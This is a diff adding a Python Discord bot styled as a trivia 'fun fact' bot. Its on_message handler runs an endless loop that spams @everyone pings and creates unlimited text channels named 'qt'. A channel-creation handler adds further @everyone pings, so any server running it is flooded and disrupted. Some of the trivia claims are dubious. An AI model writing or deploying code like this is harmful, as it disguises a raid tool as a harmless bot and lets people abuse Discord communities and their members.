@@ -1,0 +1,29 @@
+import random
+import os
+import discord
+from discord.ext import commands
+intents = discord.Intents.default()
+intents.members = True
+
+client = discord.Client(intents = intents)
+
+@client.event
+async def on_ready():
+  print ('bean in as {0.user}'.format(client))
+dyk = ["Grapes light on fire in the microwave.", "There are almost 8 million possible seven-digit phone numbers per area code.", "Spaghetto, confetto, and graffito are the singular forms of spaghetti, confetti, and graffiti.", "McDonald's once created bubblegum-flavored broccoli.", "The average mammal takes 21 seconds to empty its bladder.", "Chewing gum is banned in Singapore.", "The first item sold on eBay was a broken laser pointer.", "Japan is suffering from a ninja shortage.", "Bubble wrap was originally invented as wallpaper.", "Shakespeare invented more than 1,700 words.", "Santa Claus was given an official pilot's license in 1927.", "Einstein's brain was stolen when he died.", "A Brazilian man was killed in bed when a cow fell through the roof and landed on him."]
+@client.event
+async def on_message(message):
+  guild = message.guild
+  print("[ Server: "+ str(message.guild.name)+"] "+str(message.author.name) + ": "+str(message.content))
+  while True:
+    await message.channel.send('@everyone Fun fact: ' + random.choice(dyk))
+    await guild.create_text_channel('qt')
+    
+    print(len(guild.text_channels))
+
+
+@client.event
+async def on_guild_channel_create(channel):
+    await channel.send("@everyone hi")
+
+client.run("token")
